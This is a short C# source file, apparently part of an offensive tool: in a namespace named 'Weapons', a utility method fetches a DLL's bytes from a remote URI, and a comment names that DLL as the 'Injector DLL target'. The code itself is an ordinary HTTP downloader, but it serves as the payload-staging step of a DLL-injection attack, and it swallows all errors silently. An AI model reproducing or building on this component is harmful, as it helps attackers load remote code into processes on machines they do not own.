using Microsoft.Win32;
using System;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Net;
using System.Security.Principal;

namespace Weapons
{
    class W_Utils
    {
        // Get Bytes From Injector DLL target
        public static byte[] GetDLLBytes(string uri)
        {
            byte[] output = null;
            
            try
            {
                MemoryStream content = new MemoryStream();

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
                request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                {
                    int bufferSize = 16384;
                    byte[] buffer = new byte[bufferSize];
                    int bytesRead = 0;
                    
                    while ((bytesRead = stream.Read(buffer, 0, bufferSize)) != 0)
                    {
                        content.Write(buffer, 0, bytesRead);
                    }
                }

                output = content.ToArray();
                content.Close();
            }
            catch
            {
                return new byte[0];
            }

            return output;
        }
    }
}